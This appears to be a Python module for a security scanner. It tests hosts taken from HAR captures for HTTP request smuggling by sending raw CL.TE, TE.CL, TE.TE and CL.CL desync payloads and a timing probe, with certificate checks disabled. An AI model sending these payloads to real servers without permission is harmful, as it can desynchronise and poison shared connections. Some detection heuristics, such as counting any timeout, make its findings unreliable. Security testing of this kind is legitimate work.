"""
HTTP Request Smuggling Detection
CL.TE, TE.CL, TE.TE desync attacks
Reference: https://portswigger.net/web-security/request-smuggling
"""
import socket
import ssl
from dataclasses import dataclass
from typing import Dict, List, Optional
from urllib.parse import urlparse


@dataclass
class SmugglingResult:
    url: str
    variant: str
    vulnerable: bool
    confidence: float
    evidence: Dict
    severity: str = "Critical"
    cwe: str = "CWE-444"
    cvss: float = 9.8


class HTTPSmugglingTester:
    """
    Test for HTTP Request Smuggling vulnerabilities
    Detects CL.TE, TE.CL, and TE.TE desync attacks
    """

    SMUGGLE_PAYLOADS = {
        'CL.TE': {
            'headers': {
                'Content-Length': '6',
                'Transfer-Encoding': 'chunked'
            },
            'body': '0\r\n\r\nG'
        },
        'TE.CL': {
            'headers': {
                'Transfer-Encoding': 'chunked',
                'Content-Length': '3'
            },
            'body': '1\r\nG\r\n0\r\n\r\n'
        },
        'TE.TE_obfuscate': {
            'headers': {
                'Transfer-Encoding': 'chunked',
                'Transfer-encoding': 'x'  # Case variation
            },
            'body': '0\r\n\r\n'
        },
        'TE.TE_newline': {
            'headers': {
                'Transfer-Encoding': ' chunked',
                'Content-Length': '6'
            },
            'body': '0\r\n\r\nX'
        },
        'CL.CL': {
            'headers': {
                'Content-Length': '6',
                'Content-length': '0'  # Duplicate with different case
            },
            'body': 'GPOST '
        }
    }

    def __init__(self, har_data: Dict, config: Dict = None):
        self.har_data = har_data
        self.config = config or {}
        self.timeout = self.config.get('smuggling_timeout', 10)

    def identify_targets(self) -> List[str]:
        """Identify unique hosts for smuggling tests"""
        hosts = set()
        entries = self.har_data.get('log', {}).get('entries', [])

        for entry in entries:
            url = entry.get('request', {}).get('url', '')
            parsed = urlparse(url)
            if parsed.scheme in ['http', 'https']:
                hosts.add(f"{parsed.scheme}://{parsed.netloc}")

        return list(hosts)

    def _build_raw_request(self, host: str, payload: Dict,
                           smuggled_request: str = None) -> bytes:
        """Build raw HTTP request with smuggling payload"""
        request_lines = [
            f"POST / HTTP/1.1",
            f"Host: {host}",
        ]

        for header, value in payload['headers'].items():
            request_lines.append(f"{header}: {value}")

        request_lines.extend([
            "Connection: keep-alive",
            "Content-Type: application/x-www-form-urlencoded",
            "",
            payload['body']
        ])

        raw = "\r\n".join(request_lines)

        if smuggled_request:
            raw += smuggled_request

        return raw.encode()

    def _send_raw_request(self, host: str, port: int,
                          request: bytes, use_ssl: bool) -> Optional[bytes]:
        """Send raw request and return response"""
        try:
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE

                with socket.create_connection((host, port), timeout=self.timeout) as sock:
                    with context.wrap_socket(sock, server_hostname=host) as ssock:
                        ssock.sendall(request)
                        return ssock.recv(8192)
            else:
                with socket.create_connection((host, port), timeout=self.timeout) as sock:
                    sock.sendall(request)
                    return sock.recv(8192)
        except socket.timeout:
            return b'TIMEOUT'
        except Exception as e:
            return str(e).encode()

    def test_variant(self, base_url: str, variant_name: str,
                     payload: Dict) -> Optional[SmugglingResult]:
        """Test specific smuggling variant"""
        parsed = urlparse(base_url)
        host = parsed.netloc
        use_ssl = parsed.scheme == 'https'
        port = 443 if use_ssl else 80

        if ':' in host:
            host, port_str = host.rsplit(':', 1)
            port = int(port_str)

        # Build smuggling request
        request = self._build_raw_request(parsed.netloc, payload)

        # Send request
        response = self._send_raw_request(host, port, request, use_ssl)

        if response is None:
            return None

        response_str = response.decode('utf-8', errors='ignore')

        # Detection heuristics
        indicators = []

        # Smuggled request prefix detected
        if 'GPOST' in response_str or 'G' in response_str[:10]:
            indicators.append('Smuggled request prefix')

        # Multiple HTTP responses
        if response_str.count('HTTP/1.') > 1:
            indicators.append('Multiple HTTP responses')

        # Mixed status codes
        if '400' in response_str and '200' in response_str:
            indicators.append('Mixed status codes')

        # Timeout (indicates desync)
        if response == b'TIMEOUT':
            indicators.append('Connection timeout (possible desync)')

        if indicators:
            return SmugglingResult(
                url=base_url,
                variant=variant_name,
                vulnerable=True,
                confidence=min(0.3 * len(indicators), 1.0),
                evidence={
                    'indicators': indicators,
                    'response_preview': response_str[:500]
                }
            )

        return None

    def test_timing_based(self, base_url: str) -> Optional[SmugglingResult]:
        """
        Timing-based smuggling detection
        Send requests that should cause timeout on vulnerable servers
        """
        import time

        parsed = urlparse(base_url)
        host = parsed.netloc
        use_ssl = parsed.scheme == 'https'
        port = 443 if use_ssl else 80

        if ':' in host:
            host, port_str = host.rsplit(':', 1)
            port = int(port_str)

        # CL.TE timing payload - incomplete chunked body
        timing_payload = {
            'headers': {
                'Content-Length': '4',
                'Transfer-Encoding': 'chunked'
            },
            'body': '1\r\n'  # Incomplete chunk - server waits
        }

        request = self._build_raw_request(parsed.netloc, timing_payload)

        start = time.time()
        response = self._send_raw_request(host, port, request, use_ssl)
        elapsed = time.time() - start

        # If response took significantly longer than normal
        if elapsed > 5:
            return SmugglingResult(
                url=base_url,
                variant='CL.TE_timing',
                vulnerable=True,
                confidence=0.7,
                evidence={
                    'response_time': round(elapsed, 2),
                    'method': 'timing-based detection'
                }
            )

        return None

    def run_tests(self) -> List[SmugglingResult]:
        """Execute all smuggling tests"""
        print("[HTTPSmuggling] Scanning for request smuggling vulnerabilities...")

        targets = self.identify_targets()
        print(f"[HTTPSmuggling] Found {len(targets)} unique hosts")

        results = []

        for target in targets[:5]:  # Limit to 5 hosts
            print(f"[HTTPSmuggling] Testing: {target}")

            # Test all variants
            for variant_name, payload in self.SMUGGLE_PAYLOADS.items():
                result = self.test_variant(target, variant_name, payload)
                if result:
                    results.append(result)
                    print(f"[HTTPSmuggling] 🚨 {variant_name} detected!")

            # Timing-based test
            timing_result = self.test_timing_based(target)
            if timing_result:
                results.append(timing_result)
                print(f"[HTTPSmuggling] ⏱️ Timing-based desync detected!")

        return results

    def generate_report(self, results: List[SmugglingResult]) -> Dict:
        """Generate summary report"""
        return {
            'total_hosts_tested': len(self.identify_targets()),
            'vulnerable_count': len([r for r in results if r.vulnerable]),
            'findings': [
                {
                    'url': r.url,
                    'variant': r.variant,
                    'confidence': r.confidence,
                    'evidence': r.evidence,
                    'cwe': r.cwe,
                    'cvss': r.cvss
                }
                for r in results
            ]
        }
